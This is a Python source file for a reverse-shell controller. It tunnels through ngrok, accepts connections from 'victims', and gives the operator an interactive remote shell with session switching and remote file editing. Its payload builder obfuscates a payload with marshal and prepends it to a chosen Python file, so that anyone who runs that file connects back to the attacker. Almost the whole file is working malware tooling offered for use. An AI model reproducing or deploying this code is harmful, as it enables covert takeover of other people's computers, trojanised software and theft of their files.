import os
import sys
import cmd
import time
import socket
import tempfile
import requests
import threading

print_sys = print
from rich import print
from typing import Optional, Any, Tuple, List

TOOLS_PATH = os.path.join(__file__.rsplit('/', maxsplit=2)[0], 'tools/exploit-shell')
with open(os.path.join(TOOLS_PATH, 'payload.py')) as file:
    PAYLOAD = file.read()
while ' ':
    check_platform_name = os.popen('lsb_release -i').read().lower()
    if 'ubuntu' in check_platform_name:
        os.system(r'gnome-terminal -e "bash -c \"ngrok tcp 4444; exec bash\""')
        time.sleep(1)
    try:
        req = requests.get('http://localhost:4040/api/tunnels').json()['tunnels'][0]
        break
    except requests.exceptions.ConnectionError:
        input('\n# please open a tcp port on ngrok\n   and click [Enter] ')


HEADER: int = 64
PAYLOAD_SERVER: str = req['public_url'].replace('tcp://', '').split(':')[0]
PAYLOAD_PORT: int = req['public_url'].split(':')[2]
SERVER, PORT = req['config']['addr'].split(':')
ADDR: Tuple[str, int] = (SERVER, int(PORT))
FORMAT: str = 'utf-8'
DISCONNECT_MESSAGE: str = "!DISCONNECT"

server: object = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    server.bind(ADDR)
except OSError:
    exit("# Address already in use")

clients = set()
clients_lock = threading.Lock()


class BaseShell(cmd.Cmd):
    def __init__(self, *args, **kwargs):
        sys.stdout.write("\r")
        super(BaseShell, self).__init__(*args, **kwargs)

    def cmdloop(self, conn, addr, intro: Optional[Any] = ...) -> None:
        self.conn: object = conn
        self.addr: int = addr
        self.prompt = f"[{self.conn.getsockname()}]~$ "
        super(BaseShell, self).cmdloop(intro=intro)

    def default(self, line: str) -> ...:
        self.send(self.conn, line)
        data = self.read_str()
        if data:
            print_sys(data)

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.
        If this method is not overridden, it repeats the last nonempty
        command entered.
        """
        return None

    def completenames(self, text: str, *ignored) -> List[str]:
        packages: List[str] = super(
            BaseShell, self
        ).completenames(text, *ignored)

        packages += [
            # add linux commands to shell
            a for a in os.listdir(os.environ['SHELL'].rsplit('/', maxsplit=1)[0])
            if a.startswith(text)
        ]
        return list(set(packages))

    def do_quit(self, arg: str) -> bool:
        self.send(self.conn, DISCONNECT_MESSAGE)
        self.conn.close()
        self.cmdloop_status = False
        print(f"# Server is listening on {socket.gethostbyname(PAYLOAD_SERVER)}")
        return True

    def do_clear(self, arg: str) -> ...:
        os.system('clear')

    def do_nano(self, arg: str):
        self.send(
            self.conn,
            f"python3 -c \"data = 'x = open(\\'{arg}\\',\\'r\\');print (x.read());x.close()';exec('try:\\n \'+data+\'\\nexcept:pass')\""
        )
        with open(temp_file := os.path.join(tempfile.gettempdir(), arg), 'w') as file:
            file.write(self.read_str())
        os.system(f'nano {temp_file}')
        with open(temp_file, 'r') as file:
            self.send(self.conn, f'echo "{file.read()}" > {arg}')

    def do_victims(self, arg: str) -> ...:
        print(clients)

    def do_session(self, arg: str) -> ...:
        if arg.strip().isdigit() and int(arg) in range(0, len(clients)):
            self.conn: object = list(clients)[int(arg)]
            self.prompt = f"[{self.conn.getsockname()}]~$ "
        else:
            print('# [red]Session not found![/red]')


class ShellServer(BaseShell):
    cmdloop_status: bool = False

    def send(self, client, msg):
        # to send commands to the client.
        message: str = msg.encode(FORMAT)
        msg_length: int = len(message)
        send_length: bytes = str(msg_length).encode(FORMAT)
        send_length += b' ' * (HEADER - len(send_length))
        try:
            client.send(send_length)
            client.send(message)
        except BrokenPipeError:
            print('# Session Status is [red]offline[/red]!')

    def read_byets(self) -> bytes:
        msg_length = self.conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            return self.conn.recv(msg_length)
        return b''

    def read_str(self) -> str:
        msg_length = self.conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            return self.conn.recv(msg_length).decode(FORMAT)
        return ''

    def handle_client(self, conn, addr):
        if not self.cmdloop_status:
            print(f"# new connection...")
            print_sys(f"# {addr} connected.\n")
            self.cmdloop_status = True
            self.cmdloop(conn, addr)

    def create_payload(self):
        def marshal(code):
            import marshal as m
            return f'import marshal as m\nexec(m.loads({m.dumps(compile(code,"<String>","exec"))}))'
        if len(sys.argv) > 1:
            file = sys.argv[1]
            if os.path.isfile(file):
                with open(file, 'r') as file_r:
                    content = file_r.read()
                with open(file, 'w') as f:
                    _payload = PAYLOAD.format(injection=True, port=PAYLOAD_PORT, host=f'"{PAYLOAD_SERVER}"')
                    _payload = marshal(_payload)
                    if not _payload in content:
                        f.write(_payload+f'\n{content}')
                    else:
                        f.write(content)
            else:
                print(f"# file: {file} not found!")
                exit(-1)
        else:
            with open('payload.py', 'w') as f:
                f.write(marshal(PAYLOAD.format(injection=False, port=PAYLOAD_PORT, host=f'"{PAYLOAD_SERVER}"')))

    def start(self):
        server.listen()
        print(f"# Server is listening on {socket.gethostbyname(PAYLOAD_SERVER)}")
        while True:
            conn, addr = server.accept()
            with clients_lock:
                clients.add(conn)
            thread = threading.Thread(target=self.handle_client, args=(conn, addr))
            thread.start()


if __name__ == '__main__':
    Server = ShellServer()
    try:
        Server.create_payload()
        Server.start()
    except KeyboardInterrupt:
        print("# Server [red]stoped[/red]!")
